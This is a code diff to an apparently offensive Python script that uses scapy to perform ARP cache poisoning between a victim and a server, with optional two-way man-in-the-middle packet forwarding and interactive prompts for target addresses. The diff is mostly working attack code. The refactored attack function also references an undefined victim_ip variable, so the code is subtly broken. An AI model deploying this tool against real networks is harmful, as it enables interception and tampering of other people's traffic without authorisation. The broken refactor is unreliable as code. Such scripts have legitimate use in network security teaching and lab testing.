@@ -1,7 +1,41 @@
-from scapy.all import scapy, conf
+import scapy.all as scapy
 import time
 import sys
+import re
+import ipaddress
 
+def classify_address(address):
+    """
+    Classify a string as MAC address, IP address, or neither.
+    
+    Args:
+        address (str): The address string to classify
+    
+    Returns:
+        str: "MAC", "IP", or "ERROR"
+    """
+    if not isinstance(address, str):
+        return "ERROR"
+    
+    # remove any whitespace
+    address = address.strip()
+    
+    if not address:
+        return "ERROR"
+    
+    # check for MAC address (colon-separated format only: XX:XX:XX:XX:XX:XX)
+    mac_pattern = r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
+    if re.match(mac_pattern, address):
+        return "MAC"
+    
+    try:
+        ipaddress.ip_address(address)
+        return "IP"
+    except (ValueError, AttributeError):
+        pass
+    
+    # if neither MAC nor IP
+    return "ERROR"
 
 def get_mac_addr(ip):
     
@@ -36,20 +70,17 @@ def forward_packet(pkt, victim_ip, server_ip, victim_mac, server_mac, attacker_m
             pkt[scapy.Ether].src = attacker_mac
             scapy.sendp(pkt, verbose=False)
 
-if __name__ == "__main__":
-
-    victim_ip = sys.argv[1]
-    server_ip = sys.argv[2]
-
-    victim_mac = get_mac_addr(victim_ip)
-    server_mac = get_mac_addr(server_ip)
-    attacker_mac = scapy.get_if_hwaddr(conf.iface)
-
-
-    print(f" Victim {victim_ip} is at {victim_mac}")
-    print(f" Server {server_ip} is at {server_mac}")
-
+def attack_scheme(victim_mac, server_ip, server_mac, packet_forwarding=False):
+    """
+    Perform ARP poisoning attack.
+    """
     
+    if not server_mac:
+        server_mac = get_mac_addr(server_ip)
+    attacker_mac = scapy.get_if_hwaddr(scapy.conf.iface)
+
+    print(f" Victim is at {victim_mac}")
+    print(f" Server {server_ip} is at {server_mac}")
 
     try:
         while True:
@@ -57,11 +88,11 @@ if __name__ == "__main__":
             arp_victim = scapy.ARP(op=2, psrc=server_ip, hwsrc=attacker_mac ,pdst=victim_ip, hwdst=victim_mac)
             scapy.send(arp_victim, verbose=False)
 
-            # sending spoofed ARP packet to the server
-            arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=server_ip, hwdst=server_mac)
-            scapy.send(arp_server, verbose=False)
-
-
+            if (packet_forwarding):
+                # sending spoofed ARP packet to the server
+                arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=server_ip, hwdst=server_mac)
+                scapy.send(arp_server, verbose=False)
+            
             time.sleep(1)
     except KeyboardInterrupt:
         print("Stopping ARP poisoning")
@@ -70,6 +101,56 @@ if __name__ == "__main__":
     arp_victim = scapy.ARP(op=2, psrc=server_ip, hwsrc=server_mac, pdst=victim_ip, hwdst=victim_mac)
     scapy.send(arp_victim, verbose=False)
 
-    # restoring the server's ARP cache
-    arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=victim_mac, pdst=server_ip, hwdst=server_mac)
-    scapy.send(arp_server, verbose=False)
+    if packet_forwarding:
+        # restoring the server's ARP cache
+        arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=victim_mac, pdst=server_ip, hwdst=server_mac)
+        scapy.send(arp_server, verbose=False)
+
+if __name__ == "__main__":
+    # default
+    packet_forwarding = False
+    victim_ip = None
+    victim_mac = None
+    server_ip = None
+    server_mac = None
+
+    # ask user if they want to run a full MITM attack
+    simple = input("Do you want to run ARP poisoning with packet forwarding to server (MITM)? (y/N): ").strip().lower()
+    if simple not in ['y', 'yes', 'n', 'no']:
+        print("Invalid input. Please enter 'y' or 'n'.")
+        sys.exit(1)
+    elif simple in ['n', 'no']:
+        print("Running ARP poisoning without packet forwarding.")
+    else:
+        packet_forwarding = True
+        print("Running ARP poisoning with packet forwarding.")
+    
+    # ask user for victim's MAC address
+    victim_input = input("Enter the victim's IP or MAC address: ")
+    if (classify_address(victim_input) == "MAC"):
+        victim_mac = victim_input.strip()
+    elif (classify_address(victim_input) == "IP"):
+        victim_ip = victim_input.strip()
+        victim_mac = get_mac_addr(victim_ip)
+    else:
+        print("Invalid address. Please enter a valid IP or MAC address.")
+        sys.exit(1)
+
+    # ask user for server's IP and MAC address
+    server_ip = input("Enter the server's IP address: ").strip()
+    if classify_address(server_ip) != "IP":
+        print("Invalid server IP address. Please enter a valid IP address.")
+        sys.exit(1)
+    if (packet_forwarding):
+        server_mac = input("Enter the server's MAC address (press Enter to skip): ").strip()
+        if server_mac != "" and classify_address(server_mac) != "MAC":
+            print("Invalid server MAC address. Please enter a valid MAC address.")
+            sys.exit(1)
+
+    attack_scheme(victim_mac, server_ip, server_mac, packet_forwarding)
+    
+    
+
+    
+
+    
